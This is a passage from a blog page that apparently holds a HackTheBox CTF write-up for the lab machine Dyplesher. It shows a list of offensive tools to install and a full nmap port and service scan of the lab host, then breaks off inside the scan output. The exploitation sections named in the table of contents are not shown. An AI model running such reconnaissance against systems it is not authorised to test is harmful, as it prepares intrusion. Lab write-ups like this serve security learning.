<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Dyplesher | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,linux,insane"><meta name=description content="Dyplesher HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/dyplesher/><link crossorigin=anonymous href=/assets/css/stylesheet.8c2cb9234a4e634b8528951f7a47ea89181178c7d2c333ce2c08dfee541ed427.css integrity="sha256-jCy5I0pOY0uFKJUfekfqiRgReMfSwzPOLAjf7lQe1Cc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/dyplesher/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Dyplesher "><meta property="og:description" content="Dyplesher HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/dyplesher/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/dyplesher/dyplesher.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2020-10-24T14:01:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/dyplesher/dyplesher.png"><meta name=twitter:title content="Dyplesher "><meta name=twitter:description content="Dyplesher HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"Dyplesher ","item":"https://s4ch.github.io/writeups/hackthebox/dyplesher/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Dyplesher ","name":"Dyplesher ","description":"Dyplesher HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","linux","insane"],"articleBody":"Information Name: Dyplesher Profile: www.hackthebox.eu Difficulty: Insane OS: Linux Points: 50 Overview Install tools used in this WU on BlackArch Linux:\n1 $ pacman -S nmap ffuf gittools ruby haiti john git dbeaver intellij-idea-community-edition ruby-ctf-party radare2 vim gtfoblookup PS: radare2 for rax2 \u0026 vim for xxd\nNetwork enumeration Port \u0026 service discovery with a nmap scan:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 # Nmap 7.80 scan initiated Mon Sep 21 21:58:37 2020 as: nmap -sSVC -p- -oA nmap_full -v 10.10.10.190 Nmap scan report for 10.10.10.190 Host is up (0.023s latency). Not shown: 65525 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 7e:ca:81:78:ec:27:8f:50:60:db:79:cf:97:f7:05:c0 (RSA) | 256 e0:d7:c7:9f:f2:7f:64:0d:40:29:18:e1:a1:a0:37:5e (ECDSA) |_ 256 9f:b2:4c:5c:de:44:09:14:ce:4f:57:62:0b:f9:71:81 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E | http-methods: |_ Supported Methods: GET HEAD OPTIONS |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Dyplesher 3000/tcp open ppp? | fingerprint-strings: | GenericLines, Help: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 200 OK | Content-Type: text/html; charset=UTF-8 | Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647 | Set-Cookie: i_like_gogs=c5223df8b92fb1ca; Path=/; HttpOnly | Set-Cookie: _csrf=xX-05aCyGtiJAIiNzxC_DY6TfAo6MTYwMDcxODgyNjM0MjIxNzkyMA%3D%3D; Path=/; Expires=Tue, 22 Sep 2020 20:07:06 GMT; HttpOnly | Date: Mon, 21 Sep 2020 20:07:06 GMT | \u003c!DOCTYPE html\u003e | | | | | | | | | | | ","wordCount":"4996","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/dyplesher/dyplesher.png","datePublished":"2020-10-24T14:01:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/dyplesher/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Dyplesher</h1><div class=post-description>Dyplesher HackTheBox writeup</div><div class=post-meta><span title='2020-10-24 14:01:00 +0000 UTC'>October 24, 2020</span>&nbsp;路&nbsp;24 min&nbsp;路&nbsp;4996 words&nbsp;路&nbsp;
<a href=https://s4ch.github.io/tags/ctf/ class=post-tag title=ctf>ctf</a>
,
<a href=https://s4ch.github.io/tags/hackthebox/ class=post-tag title=hackthebox>hackthebox</a>
,
<a href=https://s4ch.github.io/tags/penetration-testing/ class=post-tag title=penetration-testing>penetration-testing</a>
,
<a href=https://s4ch.github.io/tags/writeup/ class=post-tag title=writeup>writeup</a>
,
<a href=https://s4ch.github.io/tags/linux/ class=post-tag title=linux>linux</a>
,
<a href=https://s4ch.github.io/tags/insane/ class=post-tag title=insane>insane</a>
&nbsp;路&nbsp;
<a href=https://s4ch.github.io/categories/writeups/ class=post-tag title=writeups>writeups</a></div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/dyplesher/dyplesher.png alt="Dyplesher HackTheBox Machine"><p>Dyplesher - Insane Linux Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network enumeration</a></li><li><a href=#http-discovery>HTTP discovery</a></li><li><a href=#http-enumeration>HTTP enumeration</a></li><li><a href=#memcache-exploitation>memcache exploitation</a></li><li><a href=#password-hash-cracking>Password hash cracking</a></li><li><a href=#http-discovery-2>HTTP discovery 2</a></li><li><a href=#git-discovery>git discovery</a></li><li><a href=#http-enumeration-2>HTTP enumeration 2</a></li><li><a href=#minecraft-plugin>Minecraft plugin</a></li><li><a href=#privilege-escalation-of-machine--from-minatotw-to-felamos>Privilege Escalation of Machine : from MinatoTW to felamos</a></li><li><a href=#privilege-escalation-of-machine--from-felamos-to-root>Privilege Escalation of Machine : from felamos to root</a></li></ul></nav></div></details></div><div class=post-content><h1 id=information>Information<a hidden class=anchor aria-hidden=true href=#information>#</a></h1><ul><li><strong>Name:</strong> Dyplesher</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/253>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Insane</li><li><strong>OS:</strong> Linux</li><li><strong>Points:</strong> 50</li></ul><h2 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h2><p>Install tools used in this WU on BlackArch Linux:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>pacman</span> <span class=o>-</span><span class=n>S</span> <span class=n>nmap</span> <span class=n>ffuf</span> <span class=n>gittools</span> <span class=n>ruby</span> <span class=n>haiti</span> <span class=n>john</span> <span class=n>git</span> <span class=n>dbeaver</span> <span class=n>intellij</span><span class=o>-</span><span class=n>idea</span><span class=o>-</span><span class=n>community</span><span class=o>-</span><span class=n>edition</span> <span class=n>ruby</span><span class=o>-</span><span class=n>ctf</span><span class=o>-</span><span class=n>party</span> <span class=n>radare2</span> <span class=n>vim</span> <span class=n>gtfoblookup</span>
</span></span></code></pre></td></tr></table></div></div><p>PS: <code>radare2</code> for <code>rax2</code> & <code>vim</code> for <code>xxd</code></p><h2 id=network-enumeration>Network enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h2><p>Port & service discovery with a <a href=https://nmap.org/>nmap</a> scan:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Nmap 7.80 scan initiated Mon Sep 21 21:58:37 2020 as: nmap -sSVC -p- -oA nmap_full -v 10.10.10.190
</span></span><span class=line><span class=cl>Nmap scan report for 10.10.10.190
</span></span><span class=line><span class=cl>Host is up (0.023s latency).
</span></span><span class=line><span class=cl>Not shown: 65525 filtered ports
</span></span><span class=line><span class=cl>PORT      STATE  SERVICE    VERSION
</span></span><span class=line><span class=cl>22/tcp    open   ssh        OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
</span></span><span class=line><span class=cl>| ssh-hostkey:
</span></span><span class=line><span class=cl>|   3072 7e:ca:81:78:ec:27:8f:50:60:db:79:cf:97:f7:05:c0 (RSA)
</span></span><span class=line><span class=cl>|   256 e0:d7:c7:9f:f2:7f:64:0d:40:29:18:e1:a1:a0:37:5e (ECDSA)
</span></span><span class=line><span class=cl>|_  256 9f:b2:4c:5c:de:44:09:14:ce:4f:57:62:0b:f9:71:81 (ED25519)
</span></span><span class=line><span class=cl>80/tcp    open   http       Apache httpd 2.4.41 ((Ubuntu))
</span></span><span class=line><span class=cl>|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
</span></span><span class=line><span class=cl>| http-methods:
</span></span><span class=line><span class=cl>|_  Supported Methods: GET HEAD OPTIONS
</span></span><span class=line><span class=cl>|_http-server-header: Apache/2.4.41 (Ubuntu)
</span></span><span class=line><span class=cl>|_http-title: Dyplesher
</span></span><span class=line><span class=cl>3000/tcp  open   ppp?
</span></span><span class=line><span class=cl>| fingerprint-strings:
</span></span><span class=line><span class=cl>|   GenericLines, Help:
</span></span><span class=line><span class=cl>|     HTTP/1.1 400 Bad Request
</span></span><span class=line><span class=cl>|     Content-Type: text/plain; charset=utf-8
</span></span><span class=line><span class=cl>|     Connection: close
</span></span><span class=line><span class=cl>|     Request
</span></span><span class=line><span class=cl>|   GetRequest:
</span></span><span class=line><span class=cl>|     HTTP/1.0 200 OK
</span></span><span class=line><span class=cl>|     Content-Type: text/html; charset=UTF-8
</span></span><span class=line><span class=cl>|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
</span></span><span class=line><span class=cl>|     Set-Cookie: i_like_gogs=c5223df8b92fb1ca; Path=/; HttpOnly
</span></span><span class=line><span class=cl>|     Set-Cookie: _csrf=xX-05aCyGtiJAIiNzxC_DY6TfAo6MTYwMDcxODgyNjM0MjIxNzkyMA%3D%3D; Path=/; Expires=Tue, 22 Sep 2020 20:07:06 GMT; HttpOnly
</span></span><span class=line><span class=cl>|     Date: Mon, 21 Sep 2020 20:07:06 GMT
</span></span><span class=line><span class=cl>|     &lt;!DOCTYPE html&gt;
</span></span><span class=line><span class=cl>|     &lt;html&gt;
</span></span><span class=line><span class=cl>|     &lt;head data-suburl=&#34;&#34;&gt;
</span></span><span class=line><span class=cl>|     &lt;meta http-equiv=&#34;Content-Type&#34; content=&#34;text/html; charset=UTF-8&#34; /&gt;
</span></span><span class=line><span class=cl>|     &lt;meta http-equiv=&#34;X-UA-Compatible&#34; content=&#34;IE=edge&#34;/&gt;
</span></span><span class=line><span class=cl>|     &lt;meta name=&#34;author&#34; content=&#34;Gogs&#34; /&gt;
</span></span><span class=line><span class=cl>|     &lt;meta name=&#34;description&#34; content=&#34;Gogs is a painless self-hosted Git service&#34; /&gt;
</span></span><span class=line><span class=cl>|     &lt;meta name=&#34;keywords&#34; content=&#34;go, git, self-hosted, gogs&#34;&gt;
</span></span><span class=line><span class=cl>|     &lt;meta name=&#34;referrer&#34; content=&#34;no-referrer&#34; /&gt;
</span></span><span class=line><span class=cl>|     &lt;meta name=&#34;_csrf&#34; content=&#34;xX-05aCyGtiJAIiNzxC_DY6TfAo6MTYwMDcxODgyNjM0MjIxNzkyMA==&#34; /&gt;
</span></span><span class=line><span class=cl>|     &lt;meta name=&#34;_suburl&#34; content=&#34;&#34; /&gt;
</span></span><span class=line><span class=cl>|     &lt;meta proper
</span></span><span class=line><span class=cl>|   HTTPOptions:
</span></span><span class=line><span class=cl>|     HTTP/1.0 404 Not Found
</span></span><span class=line><span class=cl>|     Content-Type: text/html; charset=UTF-8
</span></span><span class=line><span class=cl>|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
</span></span><span class=line><span class=cl>|     Set-Cookie: i_like_gogs=5a82cf2da190a2b3; Path=/; HttpOnly
</span></span><span class=line><span class=cl>|     Set-Cookie: _csrf=BNN6xvu0OovfL_MK2WhcVoSl4PI6MTYwMDcxODgzMTUyNzM3NjE4MA%3D%3D; Path=/; Expires=Tue, 22 Sep 2020 20:07:11 GMT; HttpOnly
</span></span><span class=line><span class=cl>|     Date: Mon, 21 Sep 2020 20:07:11 GMT
</span></span><span class=line><span class=cl>|     &lt;!DOCTYPE html&gt;
</span></span><span class=line><span class=cl>|     &lt;html&gt;
</span></span><span class=line><span class=cl>|     &lt;head data-suburl=&#34;&#34;&gt;
</span></span><span class=line><span class=cl>|     &lt;meta http-equiv=&#34;Content-Type&#34; content=&#34;text/html; charset=UTF-8&#34; /&gt;
</span></span><span class=line><span class=cl>|     &lt;meta http-equiv=&#34;X-UA-Compatible&#34; content=&#34;IE=edge&#34;/&gt;
</span></span><span class=line><span class=cl>|     &lt;meta name=&#34;author&#34; content=&#34;Gogs&#34; /&gt;
</span></span><span class=line><span class=cl>|     &lt;meta name=&#34;description&#34; content=&#34;Gogs is a painless self-hosted Git service&#34; /&gt;
</span></span><span class=line><span class=cl>|     &lt;meta name=&#34;keywords&#34; content=&#34;go, git, self-hosted, gogs&#34;&gt;
</span></span><span class=line><span class=cl>|     &lt;meta name=&#34;referrer&#34; content=&#34;no-referrer&#34; /&gt;
</span></span><span class=line><span class=cl>|     &lt;meta name=&#34;_csrf&#34; content=&#34;BNN6xvu0OovfL_MK2WhcVoSl4PI6MTYwMDcxODgzMTUyNzM3NjE4MA==&#34; /&gt;
</span></span><span class=line><span class=cl>|     &lt;meta name=&#34;_suburl&#34; content=&#34;&#34; /&gt;
</span></span><span class=line><span class=cl>|_    &lt;meta
</span></span><span class=line><span class=cl>4369/tcp  open   epmd       Erlang Port Mapper Daemon
</span></span><span class=line><span class=cl>| epmd-info:
</span></span><span class=line><span class=cl>|   epmd_port: 4369
</span></span><span class=line><span class=cl>|   nodes:
</span></span><span class=line><span class=cl>|_    rabbit: 25672
</span></span><span class=line><span class=cl>5672/tcp  open   amqp       RabbitMQ 3.7.8 (0-9)
</span></span><span class=line><span class=cl>| amqp-info:
</span></span><span class=line><span class=cl>|   capabilities:
</span></span><span class=line><span class=cl>|     publisher_confirms: YES
</span></span><span class=line><span class=cl>|     exchange_exchange_bindings: YES
</span></span><span class=line><span class=cl>|     basic.nack: YES
</span></span><span class=line><span class=cl>|     consumer_cancel_notify: YES
</span></span><span class=line><span class=cl>|     connection.blocked: YES
</span></span><span class=line><span class=cl>|     consumer_priorities: YES
</span></span><span class=line><span class=cl>|     authentication_failure_close: YES
</span></span><span class=line><span class=cl>|     per_consumer_qos: YES
</span></span><span class=line><span class=cl>|     direct_reply_to: YES
</span></span><span class=line><span class=cl>|   cluster_name: rabbit@dyplesher
</span></span><span class=line><span class=cl>|   copyright: Copyright (C) 2007-2018 Pivotal Software, Inc.
</span></span><span class=line><span class=cl>|   information: Licensed under the MPL.  See http://www.rabbitmq.com/
</span></span><span class=line><span class=cl>|   platform: Erlang/OTP 22.0.7
</span></span><span class=line><span class=cl>|   product: RabbitMQ
</span></span><span class=line><span class=cl>|   version: 3.7.8
</span></span><span class=line><span class=cl>|   mechanisms: PLAIN AMQPLAIN
</span></span><span class=line><span class=cl>|_  locales: en_US
</span></span><span class=line><span class=cl>11211/tcp open   memcache?
</span></span><span class=line><span class=cl>25562/tcp open   unknown
</span></span><span class=line><span class=cl>25565/tcp open   minecraft?
</span></span><span class=line><span class=cl>| fingerprint-strings:
</span></span><span class=line><span class=cl>|   DNSStatusRequestTCP, DNSVersionBindReqTCP, LDAPSearchReq, LPDString, SIPOptions, SSLSessionReq, TLSSessionReq, afp, ms-sql-s, oracle-tns:
</span></span><span class=line><span class=cl>|     &#39;{&#34;text&#34;:&#34;Unsupported protocol version&#34;}
</span></span><span class=line><span class=cl>|   NotesRPC:
</span></span><span class=line><span class=cl>|     q{&#34;text&#34;:&#34;Unsupported protocol version 0, please use one of these versions:
</span></span><span class=line><span class=cl>|_    1.8.x, 1.9.x, 1.10.x, 1.11.x, 1.12.x&#34;}
</span></span><span class=line><span class=cl>25572/tcp closed unknown
</span></span><span class=line><span class=cl>25672/tcp open   unknown
</span></span><span class=line><span class=cl>2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span class=line><span class=cl>==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
</span></span><span class=line><span class=cl>SF-Port3000-TCP:V=7.80%I=7%D=9/21%Time=5F690667%P=x86_64-unknown-linux-gnu
</span></span><span class=line><span class=cl>SF:%r(GenericLines,67,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:
</span></span><span class=line><span class=cl>SF:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20
</span></span><span class=line><span class=cl>SF:Bad\x20Request&#34;)%r(GetRequest,2063,&#34;HTTP/1\.0\x20200\x20OK\r\nContent-T
</span></span><span class=line><span class=cl>SF:ype:\x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\x20Pa
</span></span><span class=line><span class=cl>SF:th=/;\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gogs=c5223df8b92fb
</span></span><span class=line><span class=cl>SF:1ca;\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=xX-05aCyGtiJAIiNzxC
</span></span><span class=line><span class=cl>SF:_DY6TfAo6MTYwMDcxODgyNjM0MjIxNzkyMA%3D%3D;\x20Path=/;\x20Expires=Tue,\x
</span></span><span class=line><span class=cl>SF:2022\x20Sep\x202020\x2020:07:06\x20GMT;\x20HttpOnly\r\nDate:\x20Mon,\x2
</span></span><span class=line><span class=cl>SF:021\x20Sep\x202020\x2020:07:06\x20GMT\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html&gt;
</span></span><span class=line><span class=cl>SF:\n&lt;head\x20data-suburl=\&#34;\&#34;&gt;\n\t&lt;meta\x20http-equiv=\&#34;Content-Type\&#34;\x2
</span></span><span class=line><span class=cl>SF:0content=\&#34;text/html;\x20charset=UTF-8\&#34;\x20/&gt;\n\t&lt;meta\x20http-equiv=\
</span></span><span class=line><span class=cl>SF:&#34;X-UA-Compatible\&#34;\x20content=\&#34;IE=edge\&#34;/&gt;\n\t\n\t\t&lt;meta\x20name=\&#34;au
</span></span><span class=line><span class=cl>SF:thor\&#34;\x20content=\&#34;Gogs\&#34;\x20/&gt;\n\t\t&lt;meta\x20name=\&#34;description\&#34;\x20
</span></span><span class=line><span class=cl>SF:content=\&#34;Gogs\x20is\x20a\x20painless\x20self-hosted\x20Git\x20service\
</span></span><span class=line><span class=cl>SF:&#34;\x20/&gt;\n\t\t&lt;meta\x20name=\&#34;keywords\&#34;\x20content=\&#34;go,\x20git,\x20sel
</span></span><span class=line><span class=cl>SF:f-hosted,\x20gogs\&#34;&gt;\n\t\n\t&lt;meta\x20name=\&#34;referrer\&#34;\x20content=\&#34;no-
</span></span><span class=line><span class=cl>SF:referrer\&#34;\x20/&gt;\n\t&lt;meta\x20name=\&#34;_csrf\&#34;\x20content=\&#34;xX-05aCyGtiJAI
</span></span><span class=line><span class=cl>SF:iNzxC_DY6TfAo6MTYwMDcxODgyNjM0MjIxNzkyMA==\&#34;\x20/&gt;\n\t&lt;meta\x20name=\&#34;_
</span></span><span class=line><span class=cl>SF:suburl\&#34;\x20content=\&#34;\&#34;\x20/&gt;\n\t\n\t\n\t\n\t\t&lt;meta\x20proper&#34;)%r(Hel
</span></span><span class=line><span class=cl>SF:p,67,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain
</span></span><span class=line><span class=cl>SF:;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request
</span></span><span class=line><span class=cl>SF:&#34;)%r(HTTPOptions,189F,&#34;HTTP/1\.0\x20404\x20Not\x20Found\r\nContent-Type
</span></span><span class=line><span class=cl>SF::\x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\x20Path=
</span></span><span class=line><span class=cl>SF:/;\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gogs=5a82cf2da190a2b3
</span></span><span class=line><span class=cl>SF:;\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=BNN6xvu0OovfL_MK2WhcVo
</span></span><span class=line><span class=cl>SF:Sl4PI6MTYwMDcxODgzMTUyNzM3NjE4MA%3D%3D;\x20Path=/;\x20Expires=Tue,\x202
</span></span><span class=line><span class=cl>SF:2\x20Sep\x202020\x2020:07:11\x20GMT;\x20HttpOnly\r\nDate:\x20Mon,\x2021
</span></span><span class=line><span class=cl>SF:\x20Sep\x202020\x2020:07:11\x20GMT\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html&gt;\n&lt;
</span></span><span class=line><span class=cl>SF:head\x20data-suburl=\&#34;\&#34;&gt;\n\t&lt;meta\x20http-equiv=\&#34;Content-Type\&#34;\x20co
